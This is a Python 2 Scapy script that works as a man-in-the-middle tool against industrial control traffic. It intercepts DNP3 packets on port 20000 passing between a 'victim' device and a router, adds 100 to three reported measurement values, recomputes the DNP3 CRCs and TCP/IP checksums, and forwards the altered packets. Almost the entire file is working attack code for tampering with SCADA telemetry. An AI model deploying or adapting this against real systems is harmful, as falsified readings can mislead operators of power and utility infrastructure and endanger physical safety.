from bitstring import BitArray
from scapy.all import *
from uuid import getnode as get_mac
from calc_crc import calc_crc_chksum
from helpers import *
import argparse
import signal
import sys
import logging
import time
s = conf.L2socket(iface='eth0')
victimIP=""
routerIP=""
victimMAC=""
routerMAC=""
myMAC=""
interface=""
def parse_args():
	parser = argparse.ArgumentParser()
	parser.add_argument("-v", "--victimIP", help="Choose the victim IP address. Example: -v 192.168.0.5")
	parser.add_argument("-r", "--routerIP", help="Choose the router IP address. Example: -r 192.168.0.1")
	parser.add_argument("-vmac", "--victimMAC", help="Choose the victim MAC address. Example: -vmac 00:11:22:33:44:55")
	parser.add_argument("-rmac", "--routerMAC", help="Choose the router MAC address. Example: -rmac 11:22:33:44:55:66")
	parser.add_argument("-mmac", "--myMAC", help="my (attacker) MAC. Example: -mmac 11:22:33:44:55:66")
	parser.add_argument("-i", "--interface", help="interface to listen on Example: eth0")
	return parser.parse_args()

def callback(pkt):
	#modify packet here
	#print pkt.show()
        if("TCP" in pkt and "Raw" in pkt):
		#print pkt.show()
		if(pkt[TCP].sport==20000 or pkt[TCP].dport==20000):
			payload = pkt[Raw].load

			if(len(payload) >= 45):
				print "payload len: "+str(len(payload))
				old_len = len(payload)
				if(payload[12] == '\x81'):  #and payload[15] == '\x20' and payload[16] == '\x05'
					print "dnp3 values packet"
					if(len(payload) > 23):
						#value location within packet
						value = payload[23:26]+payload[28]
						value2 = payload[32:36]
						value3 = payload[39:43]
						value = hex_to_float(value)
						value2 = hex_to_float(value2)
						value3 = hex_to_float(value3)
						print "E_value: "+str(value)
						print "E_value2: "+str(value2)
						print "E_value3: "+str(value3)
						if((value > 1 or value < -1) and (value2 > 1 or value2 < -1)and (value3 > 1 or value3 < -1) and value < 10000 and value2 < 10000 and value3 < 100000):
							print "Old Value: "+str(value)
							print "Old Value2: "+str(value2)
							print "Old Value3: "+str(value3)
							#this value can now be changed as needed
							value = value + 100
							value2 = value2 + 100
							value3 = value3 + 100
							print "New Value: "+str(value)
							print "New Value2: "+str(value2)
							print "New Value3: "+str(value3)+"\n"
							crc = '\x00\x00'
							value = float_to_hex(value)
							value2 = float_to_hex(value2)
							value3 = float_to_hex(value3)
							#value = '\x00\x00\x00\x00'
							#value2 = '\x00\x00\x00\x00'
							#value3 = '\x00\x00\x00\x00'
							print pkt.show()
							print "LEN: "+str(len(payload[10:23]+value[:3]+crc))
							print "LEN(PAYLOAD): "+str(len(payload[10:23]))
							print "LEN(CRC): "+str(len(crc))
							print "LEN(value): "+str(len(value[:3]))
							pkt[Raw].load=payload[:23]+value[:3]+crc+value[3]+payload[29:32]+value2+payload[36:39]+value3+crc
							crc1 = calc_crc_chksum(pkt[Raw].load[10:26])
							crc2 = calc_crc_chksum(pkt[Raw].load[28:43])
							#crc1 = '\x9d\x08'
							#crc2 = '\x2a\xb0'
							print "chkVAL1: "+str(hex_to_float(value))
							print "chkVAL2: "+str(hex_to_float(value2))
							print "chkVAL3: "+str(hex_to_float(value3))
							pkt[Raw].load=payload[:23]+value[:3]+crc1+value[3]+payload[29:32]+value2+payload[36:39]+value3+crc2
							print pkt.show()
							del pkt[IP].chksum
							del pkt[TCP].chksum
							del pkt[IP].len
							#fix seq number
							pkt[TCP].seq=pkt[TCP].seq - old_len + len(payload)
	

	if pkt[IP].dst == victimIP and pkt.dst == myMAC:
		pkt.dst=victimMAC
		pkt.src=myMAC
		#fragments large packets
		if(len(pkt) > 1514):
			#print len(pkt)
			pkt = fragment(pkt)
			for p in pkt:
				s.send(p)
		else:
			s.send(pkt)
	elif pkt[IP].dst == routerIP and pkt.dst == myMAC:
		pkt.dst=routerMAC
		pkt.src=myMAC
		#fragments large packets
		if(len(pkt) > 1514):
			#print len(pkt)
			pkt = fragment(pkt)
			for p in pkt:
				s.send(p)
		else:
			s.send(pkt)

def main(args):
	if os.geteuid() != 0:
		sys.exit("[!] Please run as root")
	global routerIP
	global victimIP
	global routerMAC
	global victimMAC
	global myMAC
	global interface
	routerIP= args.routerIP
	victimIP = args.victimIP
	routerMAC = args.routerMAC
	victimMAC = args.victimMAC
	if(routerMAC == None):
		routerMAC = get_mac_from_ip(routerIP)
	if(victimMAC == None):
		victimMAC = get_mac_from_ip(victimIP)
	myMAC = args.myMAC
	if(myMAC == None):
		myMAC = get_my_mac()
	interface = args.interface
	if(interface == None):
		interface = "eth0"
	print "Forwarding for router ---> IP: "+routerIP+"  Mac Address: "+routerMAC
	print "Forwarding for victim ---> IP: "+victimIP+"  Mac Address: "+victimMAC+"\n"
	filter_text = "ip and ether dst host " + myMAC + " and(dst net " + victimIP  + " or dst net " + routerIP  + ")"
	sniff(filter=filter_text, prn=callback, store=0, iface=interface)
main(parse_args())



